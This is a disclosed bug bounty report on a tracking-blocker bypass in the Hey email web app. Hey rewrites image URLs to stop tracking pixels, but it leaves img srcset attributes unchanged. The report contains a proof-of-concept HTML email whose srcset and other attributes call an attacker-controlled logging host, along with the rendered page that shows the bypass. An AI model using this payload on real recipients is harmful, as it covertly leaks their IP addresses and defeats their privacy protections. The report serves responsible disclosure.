# Bypass of image rewriting / tracking blocker via srcset

## Report Details
- **Report ID**: 1021885
- **URL**: https://hackerone.com/reports/1021885
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-29T15:03:39.136Z
- **Disclosed**: 2020-12-03T12:39:40.735Z

## Reporter
- **Username**: foobar7
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: basecamp

## Vulnerability Information
CVSS
----

Medium 4.7 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N)

Description
-----------

One of the security features of Hey is blocking of [tracking pixels](https://hey.com/spy-trackers/) to preserve users privacy.

As such, `img` tags and similar are rewritten by the app to point to `gopher.hey.com`. However, an attacker can bypass this filter via the `srcset` attribute. 

POC
---

Send an email with the following code to the victim, where `example.com` is an attacker-controlled tracking server. The HTML code can for example be sent via thunderbird by clicking insert -> HTML.

    <!DOCTYPE html SYSTEM "https://example.com/log?doctype">
    <html xmlns="http://www.w3.org/1999/xhtml" manifest="https://example.com/log?html-manifest">
    <head profile="https://example.com/log?head-profile">
    </head>
    <body>
    <picture>
        <img srcset="https://example.com/log?picture-img-srcset">
    </picture>
    <img srcset=",,,,,https://example.com/log?img-srcset">
    </body>
    </html>

Open the incoming email in `https://app.hey.com`. The page will look like this:

    <html style="[...]"><head>
          <meta charset="UTF-8">
          <style>
            [...]
          </style>
          <style>@import url("https://production.haystack-assets.com/assets/message_content-1f242d41450daac108bc715557eebc198d06b738e4e50d3f1005cba03d186861.css");</style>
        </head><body><div class="message-content-inner"><div class="trix-content">
      <div class="__body">
        <p>
           <img srcset="https://example.com/log?picture-img-srcset">
          
          <img srcset=",,,,,https://example.com/log?img-srcset">
          testtest
        </p>
      </div>
    </div>
    </div></body></html>
    
It can be seen that the `srcset` attribute was not rewritten & a request will have been sent to the tracking server directly from the victim users browser.

## Impact

bypass of the img URL rewriting which prevents tracking scripts from gathering users IP addresses

## Attachments
No attachments
